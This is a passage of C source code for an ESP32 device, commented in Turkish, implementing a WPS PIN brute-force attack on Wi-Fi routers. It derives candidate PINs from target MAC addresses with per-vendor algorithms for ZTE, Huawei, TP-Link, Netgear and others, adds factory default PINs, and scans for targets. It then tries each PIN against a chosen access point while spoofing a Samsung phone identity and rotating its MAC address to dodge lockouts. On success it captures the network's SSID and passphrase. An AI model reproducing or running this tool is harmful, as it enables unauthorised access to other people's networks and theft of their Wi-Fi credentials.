                 | ((uint32_t)bssid[3] << 16)
                 | ((uint32_t)bssid[4] <<  8)
                 |  (uint32_t)bssid[5];

  uint64_t mac48 = ((uint64_t)bssid[0] << 40)
                 | ((uint64_t)bssid[1] << 32)
                 | ((uint64_t)bssid[2] << 24)
                 | ((uint64_t)bssid[3] << 16)
                 | ((uint64_t)bssid[4] <<  8)
                 |  (uint64_t)bssid[5];

  switch (vendor) {

    // ── ZTE (TTNET H108N, H168N, F660, ZXHN serisi) ─────────────────────────
    // Algoritma 1: son 3 byte'ın decimal değeri mod 10^7
    case VENDOR_ZTE:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: son 3 byte × 2 mod 10^7 (bazı ZXHN modeller)
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: son 3 byte + ilk nibble etkisi
      add_calc(pins, count, ((mac24 ^ (bssid[2] & 0x0F)) % 10000000UL));
      // ZTE fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Huawei (TTNET Fiber HG8245, HG8247, B315, B525, ONT serisi) ─────────
    // Algoritma 1: son 3 byte decimal mod 10^7 (HG532, HG8245 serisi)
    case VENDOR_HUAWEI:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: (mac[4]<<8|mac[5]) + (mac[3]<<8|mac[4]) mod 10^7
      {
        uint32_t a = ((uint32_t)bssid[4] << 8) | bssid[5];
        uint32_t b = ((uint32_t)bssid[3] << 8) | bssid[4];
        add_calc(pins, count, (a + b) % 10000000UL);
      }
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: tam MAC decimal mod 10^7 (bazı HG serisi)
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 5: mac[3] XOR mac[5] kombinasyonu
      {
        uint32_t x = ((uint32_t)(bssid[3] ^ bssid[5]) << 16)
                   | ((uint32_t)bssid[4] << 8)
                   |  (uint32_t)bssid[5];
        add_calc(pins, count, x % 10000000UL);
      }
      // Huawei fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Zyxel (Superonline VMG, AMG, NBG, P serisi) ─────────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7
    case VENDOR_ZYXEL:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac[3]*mac[4] + mac[5] (NBG serisi varyant)
      {
        uint32_t p = ((uint32_t)bssid[3] * bssid[4] + bssid[5]) % 10000000UL;
        add_calc(pins, count, p);
      }
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac24 byte swap
      {
        uint32_t swapped = ((uint32_t)bssid[5] << 16)
                         | ((uint32_t)bssid[4] <<  8)
                         |  (uint32_t)bssid[3];
        add_calc(pins, count, swapped % 10000000UL);
      }
      // Zyxel fabrika varsayılanları
      add_pin(pins, count, "00000000");
      add_pin(pins, count, "12345670");
      break;

    // ── TP-Link (tüm operatörler — TL-WR, Archer, Deco serisi) ─────────────
    // Algoritma 1: tam 48-bit MAC decimal mod 10^7 (primer)
    case VENDOR_TPLINK:
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 2: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: son 3 byte mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 4: (mac[4]*256 + mac[5]) * 100 + (mac[3] % 100) — eski TL-WR serisi
      {
        uint32_t p = ((uint32_t)bssid[4] * 256 + bssid[5]) * 100
                   + ((uint32_t)bssid[3] % 100);
        add_calc(pins, count, p % 10000000UL);
      }
      // Algoritma 5: MAC XOR rotasyonu (bazı Archer serisi)
      {
        uint32_t x = mac24 ^ 0x5A5A5AUL;
        add_calc(pins, count, x % 10000000UL);
      }
      // TP-Link fabrika varsayılanları
      add_pin(pins, count, "12345670");
      break;

    // ── Sagemcom (TTNET F@st 3686, F@st 3890, Livebox) ──────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7 (primer — F@st serisi)
    case VENDOR_SAGEMCOM:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: son 4 byte mod 10^7 (bazı F@st 3890 modeller)
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: tam MAC decimal mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: (mac[3]+mac[4]+mac[5]) * mac[5] mod 10^7 (Livebox varyant)
      {
        uint32_t p = ((uint32_t)(bssid[3] + bssid[4] + bssid[5]) * bssid[5]) % 10000000UL;
        add_calc(pins, count, p);
      }
      // Algoritma 5: mac24 byte rotasyonu (F@st 3686 bazı FW)
      {
        uint32_t rot = ((uint32_t)bssid[4] << 16)
                     | ((uint32_t)bssid[5] <<  8)
                     |  (uint32_t)bssid[3];
        add_calc(pins, count, rot % 10000000UL);
      }
      // Sagemcom fabrika varsayılanları
      add_pin(pins, count, "00000000");
      add_pin(pins, count, "12345670");
      break;

    // ── Arcadyan / Askey (Vodafone Türkiye VGV serisi) ───────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7 (Belkin/Arcadyan standart)
    case VENDOR_ARCADYAN:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: tam MAC decimal mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac24 * 7 mod 10^7 (Askey varyant)
      add_calc(pins, count, (mac24 * 7UL) % 10000000UL);
      // Algoritma 5: mac[3]^mac[4] kombinasyonu (bazı Vodafone branded modeller)
      {
        uint32_t x = ((uint32_t)(bssid[3] ^ bssid[4]) << 16)
                   | ((uint32_t)(bssid[4] ^ bssid[5]) << 8)
                   |  (uint32_t)(bssid[3] ^ bssid[5]);
        add_calc(pins, count, x % 10000000UL);
      }
      // Arcadyan fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── D-Link (DIR, DWR, DSL serisi) ────────────────────────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7
    case VENDOR_DLINK:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: NIC bytes XOR ile birleştirme (RouterKeygen D-Link)
      {
        uint32_t nic  = mac24;
        uint32_t oui  = ((uint32_t)bssid[0] << 16)
                      | ((uint32_t)bssid[1] <<  8)
                      |  (uint32_t)bssid[2];
        uint32_t xval = (nic ^ oui) % 10000000UL;
        add_calc(pins, count, xval);
      }
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 5: mac[5]*mac[4] + mac[3] varyant
      {
        uint32_t p = ((uint32_t)bssid[5] * bssid[4] + bssid[3]) % 10000000UL;
        add_calc(pins, count, p);
      }
      // D-Link fabrika varsayılanları
      add_pin(pins, count, "00000000");
      add_pin(pins, count, "12345670");
      break;

    // ── Netgear (Nighthawk R/C/D/RBK serisi) ─────────────────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7
    case VENDOR_NETGEAR:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: XOR tabanlı — NIC ^ byte swap (Netgear primer algoritma)
      {
        uint32_t x = (bssid[2] ^ bssid[5]) | ((uint32_t)(bssid[3] ^ bssid[4]) << 8);
        add_calc(pins, count, (mac24 ^ x) % 10000000UL);
      }
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 5: (mac[4]<<8|mac[5]) reversed (Nighthawk varyant)
      {
        uint32_t rv = ((uint32_t)bssid[5] << 16)
                    | ((uint32_t)bssid[3] <<  8)
                    |  (uint32_t)bssid[4];
        add_calc(pins, count, rv % 10000000UL);
      }
      // Netgear fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── ASUS (RT-AC, RT-AX, RT-N, GT-AX serisi) ─────────────────────────────
    // ASUS router'lar için araştırmacıların tespit ettiği algoritmalar
    case VENDOR_ASUS:
      // Algoritma 1: Son 3 byte decimal mod 10^7 (en yaygın ASUS algoritması)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: Son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: (mac[3]<<8|mac[5]) expand (AiMesh varyant)
      {
        uint32_t aim = ((uint32_t)bssid[3] << 16)
                     | ((uint32_t)bssid[5] <<  8)
                     |  (uint32_t)bssid[4];
        add_calc(pins, count, aim % 10000000UL);
      }
      // Algoritma 5: mac24 ile bit döndürme (eski RT-N serisi)
      add_calc(pins, count, ((mac24 >> 4) | (mac24 << (28 - 4))) % 10000000UL);
      // ASUS fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Linksys (WRT, EA, MR, Velop serisi) ──────────────────────────────────
    // Cisco/Linksys'e özgü sağa kaydırma algoritması
    case VENDOR_LINKSYS:
      // Algoritma 1: mac32 sağa 1 bit kaydırma (klasik Linksys algoritması)
      add_calc(pins, count, (mac32 >> 1) % 10000000UL);
      // Algoritma 2: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 5: mac32 sağa 2 bit (EA serisi varyant)
      add_calc(pins, count, (mac32 >> 2) % 10000000UL);
      // Linksys fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Belkin (F7D, F9K, AC serisi) ─────────────────────────────────────────
    // Belkin router'lar için basit mac24 tabanlı algoritmalar
    case VENDOR_BELKIN:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: (mac[3] XOR mac[5]) tabanlı (F9K serisi)
      {
        uint32_t bx = ((uint32_t)(bssid[3] ^ bssid[5]) << 16)
                    | ((uint32_t)bssid[4] <<  8)
                    |  (uint32_t)(bssid[3] ^ bssid[5]);
        add_calc(pins, count, bx % 10000000UL);
      }
      // Algoritma 5: mac24 * 2 (AC serisi varyant)
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Belkin fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Tenda (AC, F, N serisi — TR'de çok yaygın bütçe router) ─────────────
    // Tenda router'lar için mac tabanlı algoritmalar
    case VENDOR_TENDA:
      // Algoritma 1: mac24 mod 10^7 (en yaygın Tenda algoritması)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: (mac24 + mac[2]) mod 10^7 (F serisi varyant)
      add_calc(pins, count, (mac24 + bssid[2]) % 10000000UL);
      // Algoritma 5: mac24 XOR 0x55 (N serisi varyant)
      add_calc(pins, count, (mac24 ^ 0x555555UL) % 10000000UL);
      // Tenda fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Mercusys (MW, MR serisi — TP-Link alt markası, TR'de çok yaygın) ─────
    // TP-Link ile aynı üretim hattı — benzer algoritmalar kullanır
    case VENDOR_MERCUSYS:
      // Algoritma 1: mac24 mod 10^7 (TP-Link ile aynı temel algoritma)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac24 çift (MR serisi)
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Algoritma 5: (mac[3]<<8 | mac[4]) expand (MW serisi varyant)
      {
        uint32_t mw = ((uint32_t)bssid[3] << 16)
                    | ((uint32_t)bssid[4] <<  8)
                    |  (uint32_t)(bssid[3] ^ bssid[5]);
        add_calc(pins, count, mw % 10000000UL);
      }
      // Mercusys fabrika varsayılanları (TP-Link sub-brand, same defaults)
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Bilinmeyen vendor — genel algoritmalar ───────────────────────────────
    default:
      add_calc(pins, count, mac24 % 10000000UL);
      // Linksys / Cisco
      add_calc(pins, count, (mac32 >> 1) % 10000000UL);
      // Genel XOR
      {
        uint32_t x = (bssid[2] ^ bssid[5]) | ((uint32_t)(bssid[3] ^ bssid[4]) << 8);
        add_calc(pins, count, (mac24 ^ x) % 10000000UL);
      }
      // ARRIS / Motorola
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Technicolor / Thomson
      add_calc(pins, count, (mac24 * 3UL) % 10000000UL);
      break;
  }
}

// ─── WPS olay işleyici ────────────────────────────────────────────────────────
static void wps_event_handler(void *arg, esp_event_base_t base,
                               int32_t id, void *data) {
  if (base != WIFI_EVENT) return;
  if (id == WIFI_EVENT_STA_WPS_ER_SUCCESS) {
    wifi_event_sta_wps_er_success_t *e = (wifi_event_sta_wps_er_success_t *)data;
    if (e && e->ap_cred_cnt > 0) {
      strncpy(wps_found_ssid, (char *)e->ap_cred[0].ssid,      32);
      strncpy(wps_found_pass, (char *)e->ap_cred[0].passphrase, 64);
    }
    wps_evt_result = 1;
  } else if (id == WIFI_EVENT_STA_WPS_ER_FAILED ||
             id == WIFI_EVENT_STA_WPS_ER_TIMEOUT) {
    wps_evt_result = -1;
  }
}

static bool handler_registered = false;

static void ensure_handler() {
  if (!handler_registered) {
    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                               &wps_event_handler, nullptr);
    handler_registered = true;
  }
}

// ─── MAC rotasyonu ─────────────────────────────────────────────────────────────
// Engellemeye karşı: her N denemede STA MAC adresini rastgele değiştir.
static void rotate_sta_mac() {
  uint8_t new_mac[6];
  // Orijinal OUI'yi koru (ilk 3 byte) — AP'ye "normal" cihaz gibi görün
  memcpy(new_mac, wps_original_mac, 3);
  // Son 3 byte rastgele
  new_mac[3] = (uint8_t)esp_random();
  new_mac[4] = (uint8_t)esp_random();
  new_mac[5] = (uint8_t)esp_random();
  // Multicast bit temizle, locally-administered bit set et
  new_mac[0] = (new_mac[0] & 0xFE) | 0x02;
  esp_wifi_set_mac(WIFI_IF_STA, new_mac);
  memcpy(wps_current_mac, new_mac, 6);
  DEBUG_PRINTF("MAC rotasyonu: %02X:%02X:%02X:%02X:%02X:%02X\n",
    new_mac[0], new_mac[1], new_mac[2], new_mac[3], new_mac[4], new_mac[5]);
}

// ─── Tek PIN denemesi ──────────────────────────────────────────────────────────
// Döndürür: 1=başarı, -1=başarısız/NACK, 0=zaman aşımı
static int8_t wps_try_one(const uint8_t *bssid, int channel, const char *pin) {
  wps_evt_result = 0;
  ensure_handler();

  wifi_config_t sta = {};
  memcpy(sta.sta.bssid, bssid, 6);
  sta.sta.bssid_set = 1;
  sta.sta.channel   = (uint8_t)channel;
  esp_wifi_set_config(WIFI_IF_STA, &sta);

  esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
  // Samsung Galaxy gibi davran — bazı router'lar WPS client kimliğine bakar
  strcpy(cfg.factory_info.manufacturer, "SAMSUNG");
  strcpy(cfg.factory_info.model_name,   "Galaxy");
  strcpy(cfg.factory_info.device_name,  "SM-G998B");
  // Not: ESP-IDF 5.x'te device_pin factory_info struct üyesi kaldırıldı.
  // PIN deneme: her oturumda WPS_TYPE_PIN ile bağlanmaya çalışılır,
  // router PIN eşleşmezse FAIL eventi gelir; bir sonraki PIN'e geçilir.

  if (esp_wifi_wps_enable(&cfg) != ESP_OK)  return 0;
  if (esp_wifi_wps_start(0)     != ESP_OK)  { esp_wifi_wps_disable(); return 0; }

  unsigned long start    = millis();
  unsigned long deadline = start + WPS_PIN_TIMEOUT_MS;

  while (wps_evt_result == 0 && millis() < deadline) {
    web_interface_handle_client();
    delay(20);   // 40ms'den 20ms'ye — daha hızlı polling
  }

  esp_wifi_wps_disable();
  esp_wifi_disconnect();

  if (wps_evt_result == 0) return 0;   // zaman aşımı
  return wps_evt_result;
}

// ─── PIN listesi oluştur ──────────────────────────────────────────────────────
// Vendor PIN'leri önce gelir (istatistiksel olarak daha başarılı)
#define MAX_VENDOR_PINS  32
static char all_pins[COMMON_PIN_COUNT + MAX_VENDOR_PINS + 4][9];
static int  all_pin_count = 0;

static void build_pin_list(const uint8_t *bssid, wps_vendor_t vendor) {
  all_pin_count = 0;

  // 1. Vendor PIN'leri
  char vp[MAX_VENDOR_PINS][9];
  int  vc = 0;
  vendor_pins(bssid, vendor, vp, vc);
  for (int i = 0; i < vc && all_pin_count < (int)(sizeof(all_pins)/9); i++)
    memcpy(all_pins[all_pin_count++], vp[i], 9);

  // 2. Ortak PIN'ler (vendor kopyalarını tekrar ekleme)
  for (int i = 0; COMMON_PINS[i] && all_pin_count < (int)(sizeof(all_pins)/9); i++) {
    // Duplikat kontrolü
    bool dup = false;
    for (int j = 0; j < all_pin_count; j++) {
      if (strncmp(all_pins[j], COMMON_PINS[i], 8) == 0) { dup = true; break; }
    }
    if (!dup) memcpy(all_pins[all_pin_count++], COMMON_PINS[i], 9);
  }

  wps_total = all_pin_count;
}

// ─── Tarama ───────────────────────────────────────────────────────────────────
void wps_scan() {
  wps_attack_state = WPS_SCANNING;
  wps_target_count = 0;

  int n = WiFi.scanNetworks(false, true, false, 150);
  for (int i = 0; i < n && wps_target_count < WPS_MAX_TARGETS; i++) {
    strncpy(wps_targets[wps_target_count].ssid, WiFi.SSID(i).c_str(), 32);
    memcpy(wps_targets[wps_target_count].bssid, WiFi.BSSID(i), 6);
    wps_targets[wps_target_count].channel = WiFi.channel(i);
    wps_targets[wps_target_count].rssi    = WiFi.RSSI(i);
    wps_targets[wps_target_count].vendor  = detect_vendor(WiFi.BSSID(i));
    wps_target_count++;
  }
  WiFi.scanDelete();
  wps_attack_state = WPS_IDLE;
}

// ─── Saldırıyı başlat ─────────────────────────────────────────────────────────
void wps_start_attack(int target_index) {
  if (target_index < 0 || target_index >= wps_target_count) return;
  wps_tgt_idx        = target_index;
  wps_attempt        = 0;
  wps_evt_result     = 0;
  wps_consec_fail    = 0;
  wps_lockout_until  = 0;
  wps_lockout_count  = 0;
  wps_found_pin[0]   = '\0';
  wps_found_ssid[0]  = '\0';
  wps_found_pass[0]  = '\0';

  wps_vendor_t vendor = wps_targets[target_index].vendor;

  // Vendor adını belirle
  switch (vendor) {
    case VENDOR_ZTE:      strncpy(wps_vendor_name, "ZTE",       31); break;
    case VENDOR_HUAWEI:   strncpy(wps_vendor_name, "Huawei",    31); break;
    case VENDOR_ZYXEL:    strncpy(wps_vendor_name, "Zyxel",     31); break;
    case VENDOR_TPLINK:   strncpy(wps_vendor_name, "TP-Link",   31); break;
    case VENDOR_SAGEMCOM: strncpy(wps_vendor_name, "Sagemcom",  31); break;
    case VENDOR_ARCADYAN: strncpy(wps_vendor_name, "Arcadyan",  31); break;
    case VENDOR_DLINK:    strncpy(wps_vendor_name, "D-Link",    31); break;
    case VENDOR_NETGEAR:  strncpy(wps_vendor_name, "Netgear",   31); break;
    case VENDOR_ASUS:     strncpy(wps_vendor_name, "ASUS",      31); break;
    case VENDOR_LINKSYS:  strncpy(wps_vendor_name, "Linksys",   31); break;
    case VENDOR_BELKIN:   strncpy(wps_vendor_name, "Belkin",    31); break;
    case VENDOR_TENDA:    strncpy(wps_vendor_name, "Tenda",     31); break;
    case VENDOR_MERCUSYS: strncpy(wps_vendor_name, "Mercusys",  31); break;
    default:              strncpy(wps_vendor_name, "Bilinmeyen", 31); break;
  }

  build_pin_list(wps_targets[target_index].bssid, vendor);

  WiFi.mode(WIFI_MODE_APSTA);
  delay(100);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);

  // Orijinal MAC'i kaydet, ilk MAC'i al
  esp_wifi_get_mac(WIFI_IF_STA, wps_original_mac);
  memcpy(wps_current_mac, wps_original_mac, 6);

  wps_attack_state = WPS_ATTACKING;
  DEBUG_PRINTF("WPS Saldiri: %s [%s], %d PIN\n",
    wps_targets[target_index].ssid, wps_vendor_name, wps_total);
}

// ─── Dur ──────────────────────────────────────────────────────────────────────
void wps_stop() {
  esp_wifi_wps_disable();
  esp_wifi_disconnect();

  // Orijinal MAC'i geri yükle
  if (wps_original_mac[0] != 0 || wps_original_mac[1] != 0)
    esp_wifi_set_mac(WIFI_IF_STA, wps_original_mac);

  wps_attack_state   = WPS_STOPPED;
  wps_current_pin[0] = '\0';

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);
  delay(100);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);

  DEBUG_PRINTLN("WPS durduruldu, yonetim AP geri yuklendi.");
}

// ─── Ana döngü ────────────────────────────────────────────────────────────────
void wps_loop() {
  if (wps_attack_state != WPS_ATTACKING &&
      wps_attack_state != WPS_LOCKED_OUT) return;

  // ── Lockout bekleme modunda mıyız? ───────────────────────────────────────
  if (wps_attack_state == WPS_LOCKED_OUT) {
    unsigned long now = millis();
    if (now < wps_lockout_until) {
      // Hala bekliyoruz — web sunucuyu canlı tut
      web_interface_handle_client();
      delay(50);
      return;
    }
    // Bekleme bitti — MAC rotasyonu yap ve saldırıya devam et
    rotate_sta_mac();
    wps_consec_fail   = 0;
    wps_attack_state  = WPS_ATTACKING;
    DEBUG_PRINTLN("Lockout bekleme bitti, MAC rotasyonu, devam ediyor...");
    return;
  }

  // ── Tüm PIN'ler tükendi ───────────────────────────────────────────────────
  if (wps_attempt >= wps_total) {
    wps_attack_state = WPS_EXHAUSTED;
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS);
    delay(100);
    esp_wifi_set_max_tx_power(84);
    esp_wifi_set_ps(WIFI_PS_NONE);
    // Orijinal MAC'i geri yükle
    if (wps_original_mac[0] != 0 || wps_original_mac[1] != 0)
      esp_wifi_set_mac(WIFI_IF_STA, wps_original_mac);
    DEBUG_PRINTLN("WPS: Tum PIN'ler denendi, basari yok.");
    return;
  }

  // ── MAC rotasyonu — her WPS_MAC_ROTATE_EVERY denemede bir ────────────────
  if (wps_attempt > 0 && (wps_attempt % WPS_MAC_ROTATE_EVERY) == 0) {
    rotate_sta_mac();
    delay(200);  // AP'nin yeni MAC'i tanıması için kısa süre ver
  }

  // ── PIN dene ──────────────────────────────────────────────────────────────
  memcpy(wps_current_pin, all_pins[wps_attempt], 9);
  DEBUG_PRINTF("WPS [%d/%d] %s vendor=%s: %s\n",
    wps_attempt + 1, wps_total, wps_vendor_name, "", wps_current_pin);

  unsigned long t_start = millis();
  int8_t result = wps_try_one(
    wps_targets[wps_tgt_idx].bssid,
    wps_targets[wps_tgt_idx].channel,
    wps_current_pin);
  unsigned long t_elapsed = millis() - t_start;

  if (result == 1) {
    // ── BAŞARI ─────────────────────────────────────────────────────────────
    memcpy(wps_found_pin, wps_current_pin, 8);
    wps_found_pin[8] = '\0';
    wps_attack_state = WPS_SUCCESS;
    led_on();
    DEBUG_PRINTF("WPS BASARILI! PIN: %s, SSID: %s, Pass: %s\n",
      wps_found_pin, wps_found_ssid, wps_found_pass);
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS);
    delay(100);
    esp_wifi_set_max_tx_power(84);
    esp_wifi_set_ps(WIFI_PS_NONE);
    if (wps_original_mac[0] != 0 || wps_original_mac[1] != 0)
      esp_wifi_set_mac(WIFI_IF_STA, wps_original_mac);

  } else if (result == 0) {
    // ── Zaman aşımı → lockout tespiti ──────────────────────────────────────
    // Deneme beklenenden çok çabuk döndüyse (timeout'tan önce) AP blokluyor
    if (t_elapsed < (WPS_PIN_TIMEOUT_MS / 2)) {
      wps_consec_fail++;
      DEBUG_PRINTF("Hizli red [%d/%d]: %lums\n", wps_consec_fail,
                   WPS_LOCKOUT_THRESHOLD, t_elapsed);
      if (wps_consec_fail >= WPS_LOCKOUT_THRESHOLD) {
        wps_lockout_count++;
        wps_lockout_until = millis() + WPS_LOCKOUT_DELAY_MS;
        wps_attack_state  = WPS_LOCKED_OUT;
        DEBUG_PRINTF("LOCKOUT tespit edildi (#%d)! %lu sn bekleniyor...\n",
          wps_lockout_count, WPS_LOCKOUT_DELAY_MS / 1000);
      }
    } else {
      // Normal timeout — lockout sayacını sıfırla
      wps_consec_fail = 0;
    }
    wps_attempt++;

  } else {
    // ── NACK / Normal başarısız ─────────────────────────────────────────────
    wps_consec_fail = 0;
    wps_attempt++;
  }
}
